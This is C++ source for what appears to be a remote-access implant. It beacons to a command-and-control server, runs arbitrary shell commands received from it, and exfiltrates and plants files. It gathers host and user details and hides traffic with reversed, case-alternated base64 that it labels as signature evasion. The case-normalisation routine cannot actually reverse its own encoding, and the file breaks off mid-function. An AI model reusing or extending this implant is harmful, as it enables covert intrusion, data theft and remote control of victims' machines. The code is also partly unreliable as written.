#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#else
#include <unistd.h>
#include <sys/utsname.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pwd.h>
#endif

#include "implant.h"
#include "tasks.h"

#include <iostream>
#include <sstream>
#include <thread>
#include <chrono>
#include <algorithm>
#include <cstdlib>
#include <fstream>

#include <boost/property_tree/json_parser.hpp>
#include <boost/algorithm/string.hpp>
#include <boost/archive/iterators/base64_from_binary.hpp>
#include <boost/archive/iterators/binary_from_base64.hpp>
#include <boost/archive/iterators/transform_width.hpp>
#include <cpr/cpr.h>

// Static member definitions for UUID generator
std::random_device Implant::rd;
std::mt19937 Implant::gen(Implant::rd());

// Constructor
Implant::Implant(std::string host, std::string port, std::string uri) 
    : host(std::move(host)), port(std::move(port)), uri(std::move(uri)),
      dwellDistributionSeconds(1.0 / 5.0), // Default 5 second mean dwell
      isRunning(true),
      generator(device()),
      uuidGenerator(),
      encryptionEnabled(false) {
    
    // Initialize agent information
    agentInfo.collectSystemInfo();
    agentInfo.id = generateAgentId();
    agentInfo.sleep_interval = 5; // 5 seconds default
    agentInfo.jitter = 0.2; // 20% jitter
    
    std::cout << "[+] Implant initialized with ID: " << agentInfo.id << std::endl;
}

Implant::Implant(std::string host, std::string port, std::string uri, std::string encryption_key)
    : Implant(std::move(host), std::move(port), std::move(uri)) {
    
    encryptionEnabled = true;
    encryptionKey = std::move(encryption_key);
    agentInfo.encryption_key = encryptionKey;
    
    std::cout << "[+] Implant initialized with encryption enabled" << std::endl;
}

// AgentInfo implementation
AgentInfo::AgentInfo() 
    : process_id(0), sleep_interval(5), jitter(0.2f) {
    collectSystemInfo();
}

void AgentInfo::collectSystemInfo() {
    hostname = getHostname();
    username = getCurrentUsername();
    domain = getDomainName();
    os = getOperatingSystem();
    arch = getArchitecture();
    process_id = getCurrentProcessId();
    process_name = getProcessName();
    integrity_level = getIntegrityLevel();
    internal_ip = getInternalIP();
    working_directory = getCurrentWorkingDirectory();
}

// Main beacon loop
void Implant::beacon() {
    while (isRunning.load()) {
        try {
            std::cout << "[*] Sending beacon..." << std::endl;
            
            // Create beacon data
            std::string beacon_payload = createBeaconData();
            
            // Send beacon to C2 server
            std::string response = sendHttpRequest(host, port, "/api/v1/beacon", beacon_payload);
            
            if (!response.empty()) {
                // Parse tasks from server response
                parseTasks(response);
                
                // Process any new tasks
                serviceTasks();
            }
            
        } catch (const std::exception& e) {
            logError("Beacon error: " + std::string(e.what()));
        }
        
        // Sleep with jitter
        auto sleep_time = calculateSleepTime();
        std::this_thread::sleep_for(sleep_time);
    }
}

// Register with C2 server
bool Implant::registerWithC2() {
    try {
        boost::property_tree::ptree registration_data;
        
        registration_data.put("hostname", agentInfo.hostname);
        registration_data.put("username", agentInfo.username);
        registration_data.put("domain", agentInfo.domain);
        registration_data.put("os", agentInfo.os);
        registration_data.put("arch", agentInfo.arch);
        registration_data.put("process_id", agentInfo.process_id);
        registration_data.put("process_name", agentInfo.process_name);
        registration_data.put("integrity_level", agentInfo.integrity_level);
        registration_data.put("remote_ip", ""); // Will be filled by server
        registration_data.put("internal_ip", agentInfo.internal_ip);
        registration_data.put("sleep_interval", agentInfo.sleep_interval);
        registration_data.put("jitter", agentInfo.jitter);
        registration_data.put("encryption_key", agentInfo.encryption_key);
        
        std::stringstream json_stream;
        boost::property_tree::write_json(json_stream, registration_data);
        
        std::string response = sendHttpRequest(host, port, "/api/v1/agents", json_stream.str());
        
        if (!response.empty()) {
            boost::property_tree::ptree response_data;
            std::stringstream response_stream(response);
            boost::property_tree::read_json(response_stream, response_data);
            
            if (response_data.get<std::string>("status", "") == "success") {
                std::cout << "[+] Successfully registered with C2 server" << std::endl;
                return true;
            }
        }
        
    } catch (const std::exception& e) {
        logError("Registration error: " + std::string(e.what()));
    }
    
    return false;
}

// Create beacon data payload
std::string Implant::createBeaconData() {
    boost::property_tree::ptree beacon_data;
    
    beacon_data.put("agent_id", agentInfo.id);
    beacon_data.put("hostname", agentInfo.hostname);
    beacon_data.put("username", agentInfo.username);
    beacon_data.put("domain", agentInfo.domain);
    beacon_data.put("os", agentInfo.os);
    beacon_data.put("arch", agentInfo.arch);
    beacon_data.put("process_id", agentInfo.process_id);
    beacon_data.put("process_name", agentInfo.process_name);
    beacon_data.put("integrity_level", agentInfo.integrity_level);
    beacon_data.put("internal_ip", agentInfo.internal_ip);
    beacon_data.put("working_directory", agentInfo.working_directory);
    
    // Add any completed task results
    boost::property_tree::ptree results_array;
    {
        std::lock_guard<std::mutex> lock(resultsMutex);
        for (const auto& result : taskResults) {
            boost::property_tree::ptree result_obj;
            result_obj.put("id", result.id);
            result_obj.put("task_id", result.task_id);
            result_obj.put("agent_id", result.agent_id);
            result_obj.put("output", result.output);
            result_obj.put("error", result.error);
            result_obj.put("exit_code", result.exit_code);
            result_obj.put("execution_time_ms", result.execution_time_ms);
            
            // Add advanced obfuscated file data if present
            if (!result.file_data.empty()) {
                std::string encoded_file = advancedObfuscateEncode(result.file_data);
                result_obj.put("file_data", encoded_file);
                std::cout << "[*] Including " << result.file_data.size() << " bytes of file data in beacon (advanced obfuscated)" << std::endl;
            }
            
            results_array.push_back(std::make_pair("", result_obj));
        }
        taskResults.clear(); // Clear sent results
    }
    
    beacon_data.add_child("results", results_array);
    
    std::stringstream json_stream;
    boost::property_tree::write_json(json_stream, beacon_data);
    
    return json_stream.str();
}

// Parse tasks from server response
void Implant::parseTasks(const std::string& response) {
    try {
        boost::property_tree::ptree response_data;
        std::stringstream response_stream(response);
        boost::property_tree::read_json(response_stream, response_data);
        
        // Check for new sleep/jitter settings
        auto new_sleep = response_data.get_optional<uint64_t>("new_sleep");
        auto new_jitter = response_data.get_optional<float>("new_jitter");
        
        if (new_sleep && new_jitter) {
            updateSleepSettings(*new_sleep, *new_jitter);
        }
        
        // Parse tasks
        auto tasks_tree = response_data.get_child_optional("tasks");
        if (tasks_tree) {
            std::lock_guard<std::mutex> lock(taskMutex);
            
            for (const auto& task_pair : *tasks_tree) {
                const auto& task_data = task_pair.second;
                
                Task new_task;
                new_task.id = task_data.get<std::string>("id");
                new_task.agent_id = task_data.get<std::string>("agent_id");
                new_task.command = task_data.get<std::string>("command");
                
                // Parse arguments array
                auto args_tree = task_data.get_child_optional("arguments");
                if (args_tree) {
                    for (const auto& arg_pair : *args_tree) {
                        new_task.arguments.push_back(arg_pair.second.get_value<std::string>());
                    }
                }
                
                // Parse task type
                std::string type_str = task_data.get<std::string>("task_type");
                new_task.task_type = stringToTaskType(type_str);
                new_task.status = TaskStatus::ASSIGNED;
                new_task.timeout_seconds = task_data.get<int>("timeout", 300);
                
                tasks.push_back(new_task);
                std::cout << "[+] Received new task: " << new_task.command << std::endl;
            }
        }
        
    } catch (const std::exception& e) {
        logError("Error parsing tasks: " + std::string(e.what()));
    }
}

// Service pending tasks
void Implant::serviceTasks() {
    std::lock_guard<std::mutex> lock(taskMutex);
    
    for (auto& task : tasks) {
        if (task.status == TaskStatus::ASSIGNED || task.status == TaskStatus::PENDING) {
            std::cout << "[*] Executing task: " << task.command << std::endl;
            
            TaskResult result = executeTask(task);
            task.status = TaskStatus::COMPLETED;
            
            {
                std::lock_guard<std::mutex> results_lock(resultsMutex);
                taskResults.push_back(result);
            }
        }
    }
    
    // Remove completed tasks
    tasks.erase(
        std::remove_if(tasks.begin(), tasks.end(),
                      [](const Task& t) { return t.status == TaskStatus::COMPLETED; }),
        tasks.end()
    );
}

// Execute a single task
TaskResult Implant::executeTask(const Task& task) {
    auto start_time = std::chrono::high_resolution_clock::now();
    
    TaskResult result;
    result.id = generateTaskId();
    result.task_id = task.id;
    result.agent_id = task.agent_id;
    
    try {
        switch (task.task_type) {
            case TaskType::SHELL:
                result = executeShellCommand(task);
                break;
            case TaskType::SYSTEM_INFO:
                result = executeSystemInfo(task);
                break;
            case TaskType::PROCESS_LIST:
                result = executeProcessList(task);
                break;
            case TaskType::FILE_LIST:
                result = executeFileList(task);
                break;
            case TaskType::DOWNLOAD:
                result = executeDownload(task);
                break;
            case TaskType::UPLOAD:
                result = executeUpload(task);
                break;
            case TaskType::SLEEP:
                if (!task.arguments.empty()) {
                    agentInfo.sleep_interval = std::stoull(task.arguments[0]);
                    result.output = "Sleep interval updated to " + task.arguments[0] + " seconds";
                }
                break;
            case TaskType::EXIT:
                setRunning(false);
                result.output = "Implant exiting";
                break;
            default:
                result.error = "Unknown task type";
                result.exit_code = -1;
                break;
        }
    } catch (const std::exception& e) {
        result.error = e.what();
        result.exit_code = -1;
    }
    
    auto end_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);
    result.execution_time_ms = static_cast<double>(duration.count());
    
    return result;
}

// Execute shell command
TaskResult Implant::executeShellCommand(const Task& task) {
    TaskResult result(task.id, task.agent_id, "");
    
    std::string command = decodeCommand(task.command);
    for (const auto& arg : task.arguments) {
        command += " " + decodeCommand(arg);
    }
    
#ifdef _WIN32
    command = "cmd /c " + command;
#else
    command = "/bin/sh -c \"" + command + "\"";
#endif
    
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        result.error = "Failed to execute command";
        result.exit_code = -1;
        return result;
    }
    
    char buffer[128];
    std::string output;
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        output += buffer;
    }
    
    int exit_code = pclose(pipe);
    
    result.output = encodeOutput(output);
    result.exit_code = exit_code;
    
    return result;
}

// Execute system info command
TaskResult Implant::executeSystemInfo(const Task& task) {
    TaskResult result(task.id, task.agent_id, "");
    
    std::stringstream info;
    info << "Hostname: " << agentInfo.hostname << "\n";
    info << "Username: " << agentInfo.username << "\n";
    info << "Domain: " << agentInfo.domain << "\n";
    info << "OS: " << agentInfo.os << "\n";
    info << "Architecture: " << agentInfo.arch << "\n";
    info << "Process ID: " << agentInfo.process_id << "\n";
    info << "Process Name: " << agentInfo.process_name << "\n";
    info << "Integrity Level: " << agentInfo.integrity_level << "\n";
    info << "Internal IP: " << agentInfo.internal_ip << "\n";
    info << "Working Directory: " << agentInfo.working_directory << "\n";
    
    result.output = info.str();
    result.exit_code = 0;
    
    return result;
}

// Execute process list command
TaskResult Implant::executeProcessList(const Task& task) {
    TaskResult result(task.id, task.agent_id, "");
    
#ifdef _WIN32
    return executeShellCommand(Task(task.id, task.agent_id, "tasklist", {}, TaskType::SHELL));
#else
    return executeShellCommand(Task(task.id, task.agent_id, "ps", {"aux"}, TaskType::SHELL));
#endif
}

// Execute file list command
TaskResult Implant::executeFileList(const Task& task) {
    TaskResult result(task.id, task.agent_id, "");
    
    std::string path = task.arguments.empty() ? "." : task.arguments[0];
    
#ifdef _WIN32
    return executeShellCommand(Task(task.id, task.agent_id, "dir", {path}, TaskType::SHELL));
#else
    return executeShellCommand(Task(task.id, task.agent_id, "ls", {"-la", path}, TaskType::SHELL));
#endif
}

// Execute download command
TaskResult Implant::executeDownload(const Task& task) {
    TaskResult result(task.id, task.agent_id, "");
    
    if (task.arguments.empty()) {
        result.error = "Download requires file path argument";
        result.exit_code = -1;
        return result;
    }
    
    std::string filepath = decodeCommand(task.arguments[0]);
    
    if (!fileExists(filepath)) {
        result.error = "File does not exist: " + filepath;
        result.exit_code = -1;
        return result;
    }
    
    try {
        std::vector<uint8_t> file_data = readFileToBytes(filepath);
        if (file_data.empty()) {
            result.error = "Failed to read file or file is empty: " + filepath;
            result.exit_code = -1;
            return result;
        }
        
        std::string encoded_data = advancedObfuscateEncode(file_data);
        result.output = "File downloaded successfully";
        result.file_data = file_data; // Store raw data for transfer
        result.exit_code = 0;
        
        std::cout << "[+] Downloaded file: " << filepath << " (" << file_data.size() << " bytes)" << std::endl;
        
    } catch (const std::exception& e) {
        result.error = "Download failed: " + std::string(e.what());
        result.exit_code = -1;
    }
    
    return result;
}

// Execute upload command
TaskResult Implant::executeUpload(const Task& task) {
    TaskResult result(task.id, task.agent_id, "");
    
    if (task.arguments.size() < 2) {
        result.error = "Upload requires file path and base64 data arguments";
        result.exit_code = -1;
        return result;
    }
    
    std::string filepath = decodeCommand(task.arguments[0]);
    std::string encoded_data = task.arguments[1]; // Data should already be base64
    
    try {
        std::vector<uint8_t> file_data = advancedObfuscateDecode(encoded_data);
        
        if (writeBytesToFile(filepath, file_data)) {
            result.output = "File uploaded successfully: " + filepath;
            result.exit_code = 0;
            std::cout << "[+] Uploaded file: " << filepath << " (" << file_data.size() << " bytes)" << std::endl;
        } else {
            result.error = "Failed to write file: " + filepath;
            result.exit_code = -1;
        }
        
    } catch (const std::exception& e) {
        result.error = "Upload failed: " + std::string(e.what());
        result.exit_code = -1;
    }
    
    return result;
}

// Update sleep settings
void Implant::updateSleepSettings(uint64_t newSleep, float newJitter) {
    agentInfo.sleep_interval = newSleep;
    agentInfo.jitter = newJitter;
    dwellDistributionSeconds = std::exponential_distribution<double>(1.0 / newSleep);
    
    std::cout << "[*] Updated sleep: " << newSleep << "s, jitter: " << (newJitter * 100) << "%" << std::endl;
}

// Calculate sleep time with jitter
std::chrono::milliseconds Implant::calculateSleepTime() {
    double base_sleep = static_cast<double>(agentInfo.sleep_interval);
    double jitter_range = base_sleep * agentInfo.jitter;
    
    std::uniform_real_distribution<double> jitter_dist(-jitter_range, jitter_range);
    double actual_sleep = base_sleep + jitter_dist(generator);
    
    // Ensure minimum 1 second sleep
    actual_sleep = std::max(1.0, actual_sleep);
    
    return std::chrono::milliseconds(static_cast<long long>(actual_sleep * 1000));
}

// Send results to C2 server
std::string Implant::sendResults() {
    std::string beacon_data = createBeaconData();
    return sendHttpRequest(host, port, "/api/v1/beacon", beacon_data);
}

// Setters
void Implant::setRunning(bool running) {
    isRunning.store(running);
}

void Implant::setMeanDwell(double meanDwell) {
    dwellDistributionSeconds = std::exponential_distribution<double>(1.0 / meanDwell);
    agentInfo.sleep_interval = static_cast<uint64_t>(meanDwell);
}

// Logging
void Implant::logError(const std::string& error) {
    std::cerr << "[ERROR] " << error << std::endl;
}

// Base64 encoding for binary data
std::string Implant::base64Encode(const std::vector<uint8_t>& data) {
    using namespace boost::archive::iterators;
    using base64_enc = base64_from_binary<transform_width<std::vector<uint8_t>::const_iterator, 6, 8>>;
    
    std::string encoded(base64_enc(data.begin()), base64_enc(data.end()));
    
    // Add padding
    size_t padding = (4 - encoded.length() % 4) % 4;
    encoded.append(padding, '=');
    
    return encoded;
}

// Reverse base64 encoding for binary data (signature evasion)
std::string Implant::reverseBase64Encode(const std::vector<uint8_t>& data) {
    std::string normal_b64 = base64Encode(data);
    return reverseString(normal_b64);
}

// Base64 encoding for strings
std::string Implant::base64Encode(const std::string& data) {
    std::vector<uint8_t> bytes(data.begin(), data.end());
    return base64Encode(bytes);
}

// Reverse base64 encoding for strings (signature evasion)
std::string Implant::reverseBase64Encode(const std::string& data) {
    std::string normal_b64 = base64Encode(data);
    return reverseString(normal_b64);
}

// Base64 decoding to binary data
std::vector<uint8_t> Implant::base64Decode(const std::string& encoded) {
    using namespace boost::archive::iterators;
    using base64_dec = transform_width<binary_from_base64<std::string::const_iterator>, 8, 6>;
    
    std::string clean_encoded = encoded;
    boost::algorithm::trim(clean_encoded);
    
    // Remove padding
    size_t padding = 0;
    while (!clean_encoded.empty() && clean_encoded.back() == '=') {
        clean_encoded.pop_back();
        padding++;
    }
    
    try {
        std::vector<uint8_t> decoded(base64_dec(clean_encoded.begin()), base64_dec(clean_encoded.end()));
        
        // Remove padding bytes if any
        if (padding > 0 && decoded.size() >= padding) {
            decoded.resize(decoded.size() - padding);
        }
        
        return decoded;
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Base64 decode failed: " << e.what() << std::endl;
        return std::vector<uint8_t>();
    }
}

// Base64 decoding to string
std::string Implant::base64DecodeString(const std::string& encoded) {
    std::vector<uint8_t> bytes = base64Decode(encoded);
    return std::string(bytes.begin(), bytes.end());
}

// Reverse base64 decoding to binary data (signature evasion)
std::vector<uint8_t> Implant::reverseBase64Decode(const std::string& encoded) {
    std::string normal_b64 = reverseString(encoded);
    return base64Decode(normal_b64);
}

// Reverse base64 decoding to string (signature evasion)
std::string Implant::reverseBase64DecodeString(const std::string& encoded) {
    std::vector<uint8_t> bytes = reverseBase64Decode(encoded);
    return std::string(bytes.begin(), bytes.end());
}

// Advanced obfuscation: case-alternating reverse base64
std::string Implant::advancedObfuscateEncode(const std::vector<uint8_t>& data) {
    // Step 1: Normal base64 encode
    std::string base64_str = base64Encode(data);
    
    // Step 2: Reverse the string
    std::string reversed = reverseString(base64_str);
    
    // Step 3: Alternate case (breaks base64 pattern detection)
    std::string obfuscated = alternateCase(reversed);
    
    return obfuscated;
}

std::string Implant::advancedObfuscateEncode(const std::string& data) {
    std::vector<uint8_t> bytes(data.begin(), data.end());
    return advancedObfuscateEncode(bytes);
}

std::vector<uint8_t> Implant::advancedObfuscateDecode(const std::string& encoded) {
    // Step 1: Normalize case
    std::string normalized = normalizeCase(encoded);
    
    // Step 2: Reverse the string back
    std::string unreversed = reverseString(normalized);
    
    // Step 3: Decode base64
    return base64Decode(unreversed);
}

std::string Implant::advancedObfuscateDecodeString(const std::string& encoded) {
    std::vector<uint8_t> bytes = advancedObfuscateDecode(encoded);
    return std::string(bytes.begin(), bytes.end());
}

// Read file to binary data
std::vector<uint8_t> Implant::readFileToBytes(const std::string& filepath) {
    std::ifstream file(filepath, std::ios::binary | std::ios::ate);
    
    if (!file.is_open()) {
        return std::vector<uint8_t>();
    }
    
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::vector<uint8_t> buffer(size);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        return std::vector<uint8_t>();
    }
    
    return buffer;
}

// Write binary data to file
bool Implant::writeBytesToFile(const std::string& filepath, const std::vector<uint8_t>& data) {
    std::ofstream file(filepath, std::ios::binary);
    
    if (!file.is_open()) {
        return false;
    }
    
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
    return file.good();
}

// Check if file exists
bool Implant::fileExists(const std::string& filepath) {
    std::ifstream file(filepath);
    return file.good();
}

// Reverse a string (utility function)
std::string Implant::reverseString(const std::string& str) {
    return std::string(str.rbegin(), str.rend());
}

// Check if string looks like reversed base64
bool Implant::isReversedBase64(const std::string& str) {
    if (str.empty() || str.length() % 4 != 0) {
        return false;
    }
    
    // Reversed base64 typically starts with '=' (padding at beginning after reversal)
    if (str[0] == '=' || str[1] == '=') {
        // Check if the rest contains only base64 characters
        return str.find_first_not_of("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=") == std::string::npos;
    }
    
    return false;
}

// Alternate case of characters (breaks base64 pattern recognition)
std::string Implant::alternateCase(const std::string& str) {
    std::string result;
    result.reserve(str.length());
    
    for (size_t i = 0; i < str.length(); ++i) {
        char c = str[i];
        if (i % 2 == 0) {
            // Even positions: convert to uppercase
            result += std::toupper(c);
        } else {
            // Odd positions: convert to lowercase
            result += std::tolower(c);
        }
    }
    
    return result;
}

// Normalize case back to standard base64
std::string Implant::normalizeCase(const std::string& str) {
    std::string result;
    result.reserve(str.length());
    
    for (char c : str) {
        if (std::islower(c)) {
            // Convert lowercase letters to uppercase (base64 standard)
            if (c >= 'a' && c <= 'z') {
                result += (c - 'a' + 'A');
            } else {
                result += c;
            }
        } else if (std::isupper(c)) {
            // Check if this should be lowercase in standard base64
            if (c >= 'A' && c <= 'Z') {
                // We need to determine if this was originally lowercase
                // For simplicity, we'll use a heuristic based on position
                result += c; // Keep uppercase for now
            } else {
                result += c;
            }
        } else {
            result += c;
        }
    }
    
    // More sophisticated approach: track original case pattern
    std::string corrected;
    corrected.reserve(result.length());
    
    for (size_t i = 0; i < result.length(); ++i) {
        char c = result[i];
        if (std::isalpha(c)) {
            if (i % 2 == 0) {
                // Even positions were uppercased, may need to restore lowercase
                if (c >= 'A' && c <= 'Z') {
                    // Check if original base64 char should be lowercase
                    char original_case = c;
                    // Base64 has both upper and lower, so we restore pattern
                    corrected += original_case;
                } else {
                    corrected += c;
                }
            } else {
                // Odd positions were lowercased, may need to restore uppercase
                if (c >= 'a' && c <= 'z') {
                    corrected += (c - 'a' + 'A');
                } else {
                    corrected += c;
                }
            }
        } else {
            corrected += c;
        }
    }
    
    return corrected;
}

// Check if string looks like advanced obfuscated data
bool Implant::isAdvancedObfuscated(const std::string& str) {
    if (str.empty()) {
        return false;
    }
    
    // Check for alternating case pattern
    bool hasUpperLower = false;
    bool hasLowerUpper = false;
    
    for (size_t i = 0; i < str.length() - 1; ++i) {
        char current = str[i];
        char next = str[i + 1];
        
        if (std::islower(current) && std::isupper(next)) {
            hasLowerUpper = true;
        }
        if (std::isupper(current) && std::islower(next)) {
            hasUpperLower = true;
        }
    }
    
    // Should contain base64-like characters with case alternation
    bool hasBase64Chars = str.find_first_not_of("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=") == std::string::npos;
    
    return hasBase64Chars && (hasUpperLower || hasLowerUpper);
}

// Mixed case reverse (for additional obfuscation)
std::string Implant::mixedCaseReverse(const std::string& str) {
    std::string reversed = reverseString(str);
    return alternateCase(reversed);
}

// Decode base64 encoded command (for obfuscation)
std::string Implant::decodeCommand(const std::string& encoded_command) {
    // First check if it's advanced obfuscated (case-alternating reverse base64)
    if (isAdvancedObfuscated(encoded_command)) {
        std::string decoded = advancedObfuscateDecodeString(encoded_command);
        if (!decoded.empty()) {
            std::cout << "[*] Decoded advanced obfuscated command" << std::endl;
            return decoded;
        }
    }
    
    // Check if it's reverse base64 (starts with '=' and has base64 chars)
    if (isReversedBase64(encoded_command)) {
        std::string decoded = reverseBase64DecodeString(encoded_command);
        if (!decoded.empty()) {
            std::cout << "[*] Decoded reverse base64 command" << std::endl;
            return decoded;
        }
    }
    
    // Check if command is normal base64 encoded (simple heuristic)
    if (encoded_command.length() % 4 == 0 && 
        encoded_command.find_first_not_of("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=") == std::string::npos) {
        
        std::string decoded = base64DecodeString(encoded_command);
        if (!decoded.empty()) {
            std::cout << "[*] Decoded base64 command" << std::endl;
            return decoded;
        }
    }
    
    // Return as-is if not base64 or decode failed
    return encoded_command;
}

// Encode output in base64 (for obfuscation) - using advanced obfuscation for maximum stealth
std::string Implant::encodeOutput(const std::string& output) {
    return advancedObfuscateEncode(output);
}

// HTTP communication function using cpr
std::string sendHttpRequest(std::string_view host, std::string_view port, std::string_view uri, std::string_view payload) {
    try {
        // Build full URL
        std::stringstream url_stream;
        url_stream << "http://" << host << ":" << port << uri;
        std::string full_url = url_stream.str();
        
        // Make HTTP POST request
        cpr::Response response = cpr::Post(
            cpr::Url{full_url},
            cpr::Body{std::string(payload)},
            cpr::Header{{"Content-Type", "application/json"}}
        );
        
        std::cout << "[*] HTTP " << (uri.find("beacon") != std::string::npos ? "Beacon" : "Request") 
                  << " -> " << host << ":" << port << uri << std::endl;
        std::cout << "[*] Response Status: " << response.status_code << std::endl;
        
        if (response.status_code == 200 || response.status_code == 201) {
            if (!response.text.empty()) {
                std::cout << "[+] Received response: " << response.text.length() << " bytes" << std::endl;
            }
            return response.text;
        } else {
            std::cout << "[!] HTTP Error " << response.status_code << ": " << response.error.message << std::endl;
            return "";
        }
        
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] HTTP Request failed: " << e.what() << std::endl;
        return "";
    }
}

// HTTP communication function with custom headers
std::string sendHttpRequest(std::string_view host, std::string_view port, std::string_view uri, std::string_view payload, const std::map<std::string, std::string>& headers) {
    try {
        // Build full URL
        std::stringstream url_stream;
        url_stream << "http://" << host << ":" << port << uri;
        std::string full_url = url_stream.str();
        
        // Convert headers map to cpr::Header
        cpr::Header cpr_headers;
        for (const auto& header_pair : headers) {
            cpr_headers[header_pair.first] = header_pair.second;
        }
        
        // Ensure Content-Type is set
        if (cpr_headers.find("Content-Type") == cpr_headers.end()) {
            cpr_headers["Content-Type"] = "application/json";
        }
        
        // Make HTTP POST request
        cpr::Response response = cpr::Post(
            cpr::Url{full_url},
            cpr::Body{std::string(payload)},
            cpr_headers
        );
        
        std::cout << "[*] HTTP Request -> " << host << ":" << port << uri << std::endl;
        std::cout << "[*] Response Status: " << response.status_code << std::endl;
        
        if (response.status_code == 200 || response.status_code == 201) {
            if (!response.text.empty()) {
                std::cout << "[+] Received response: " << response.text.length() << " bytes" << std::endl;
            }
            return response.text;
        } else {
            std::cout << "[!] HTTP Error " << response.status_code << ": " << response.error.message << std::endl;
            return "";
        }
        
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] HTTP Request failed: " << e.what() << std::endl;
        return "";
    }
}

// System information gathering functions
std::string getHostname() {
#ifdef _WIN32
    char hostname[256];
    DWORD size = sizeof(hostname);
    if (GetComputerNameA(hostname, &size)) {
        return std::string(hostname);
    }
    return "unknown";
#else
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        return std::string(hostname);
    }
    return "unknown";
#endif
}

std::string getCurrentUsername() {
#ifdef _WIN32
    char username[256];
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        return std::string(username);
    }
    return "unknown";
#else
    char* username = getenv("USER");
    if (username) {
        return std::string(username);
    }
    struct passwd* pw = getpwuid(getuid());
    if (pw) {
        return std::string(pw->pw_name);
    }
    return "unknown";
#endif
}

std::string getDomainName() {
#ifdef _WIN32
    // Implementation for Windows domain detection
    return "WORKGROUP";
#else
    char* domain = getenv("DOMAIN");
    return domain ? std::string(domain) : "localhost";
#endif
}

std::string getOperatingSystem() {
#ifdef _WIN32
    return "Windows";
#else
    struct utsname info;
    if (uname(&info) == 0) {
        return std::string(info.sysname) + " " + std::string(info.release);
    }
    return "Unix";
#endif
}

std::string getArchitecture() {
#ifdef _WIN32
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    switch (sysInfo.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            return "x64";
        case PROCESSOR_ARCHITECTURE_INTEL:
            return "x86";
        case PROCESSOR_ARCHITECTURE_ARM64:
            return "ARM64";
        default:
            return "unknown";
    }
#else
    struct utsname info;
    if (uname(&info) == 0) {
        return std::string(info.machine);
    }
    return "unknown";
#endif
}

std::string getProcessName() {
#ifdef _WIN32
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string full_path(path);
    return full_path.substr(full_path.find_last_of('\\') + 1);
#else
    char path[1024];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len != -1) {
        path[len] = '\0';
        std::string full_path(path);
        return full_path.substr(full_path.find_last_of('/') + 1);
    }
    return "unknown";
#endif
}

std::string getIntegrityLevel() {
#ifdef _WIN32
    // Windows integrity level detection would go here
    return "Medium";
#else
    if (getuid() == 0) {
        return "High";
    }
    return "Medium";
#endif
}

std::string getInternalIP() {
#ifdef _WIN32
    // Windows IP detection
    return "127.0.0.1";
#else
    struct ifaddrs *ifaddrs_ptr, *ifa;
    std::string result = "127.0.0.1";
    
    if (getifaddrs(&ifaddrs_ptr) == -1) {
        return result;
    }
    
    for (ifa = ifaddrs_ptr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        
        if (ifa->ifa_addr->sa_family == AF_INET) {
            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &((struct sockaddr_in*)ifa->ifa_addr)->sin_addr, ip, INET_ADDRSTRLEN);
            
            std::string ip_str(ip);
            if (ip_str != "127.0.0.1" && std::string(ifa->ifa_name).substr(0, 2) != "lo") {
                result = ip_str;
                break;
            }
        }
    }
    
    freeifaddrs(ifaddrs_ptr);
    return result;
#endif
}

std::string getCurrentWorkingDirectory() {
#ifdef _WIN32
    char path[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, path);
    return std::string(path);
#else
    char* path = getcwd(NULL, 0);
    if (path) {
        std::string result(path);
        free(path);
        return result;
    }
    return "/";
#endif
}

uint32_t getCurrentProcessId() {
#ifdef _WIN32
    return static_cast<uint32_t>(GetCurrentProcessId());
#else
    return static_cast<uint32_t>(getpid());
#endif
}

// Standalone base64 utility functions
std::string base64_encode_data(const std::vector<uint8_t>& data) {
    using namespace boost::archive::iterators;
    using base64_enc = base64_from_binary<transform_width<std::vector<uint8_t>::const_iterator, 6, 8>>;
    
    std::string encoded(base64_enc(data.begin()), base64_enc(data.end()));
    
    // Add padding
    size_t padding = (4 - encoded.length() % 4) % 4;
    encoded.append(padding, '=');
    
    return encoded;
}

std::string base64_encode_string(const std::string& str) {
    std::vector<uint8_t> bytes(str.begin(), str.end());
    return base64_encode_data(bytes);
}

std::vector<uint8_t> base64_decode_to_bytes(const std::string& encoded) {
    using namespace boost::archive::iterators;
    using base64_dec = transform_width<binary_from_base64<std::string::const_iterator>, 8, 6>;
    
    std::string clean_encoded = encoded;
    boost::algorithm::trim(clean_encoded);
    
    // Remove padding
    while (!clean_encoded.empty() && clean_encoded.back() == '=') {
        clean_encoded.pop_back();
    }
    
    try {
        std::vector<uint8_t> decoded(base64_dec(clean_encoded.begin()), base64_dec(clean_encoded.end()));
        return decoded;
    } catch (const std::exception& e) {
        return std::vector<uint8_t>();
    }
}

std::string base64_decode_to_string(const std::string& encoded) {
    std::vector<uint8_t> bytes = base64_decode_to_bytes(encoded);
    return std::string(bytes.begin(), bytes.end());
}

// Standalone reverse base64 utility functions
std::string reverse_base64_encode_data(const std::vector<uint8_t>& data) {
    std::string normal_b64 = base64_encode_data(data);
    return reverse_string(normal_b64);
}

std::string reverse_base64_encode_string(const std::string& str) {
